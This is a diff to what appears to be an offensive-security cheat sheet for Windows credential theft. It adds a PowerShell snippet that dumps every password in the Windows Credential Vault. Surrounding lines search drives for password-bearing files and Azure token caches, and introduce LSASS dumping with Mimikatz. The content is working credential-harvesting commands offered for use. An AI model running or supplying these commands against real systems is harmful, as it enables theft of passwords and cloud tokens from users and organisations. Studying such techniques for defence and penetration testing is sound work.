@@ -108,6 +108,13 @@ Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-St
 Get-ChildItem -path "C:\Users\*" -Recurse -Include *accessTokens.json*, *TokenCache.dat*, *AzureRmContext.json*
 ```
 
+#### Dump password vault
+```
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
+```
+
 ## Dumping LSASS
 #### Dump credentials on a local machine using Mimikatz.
 ```
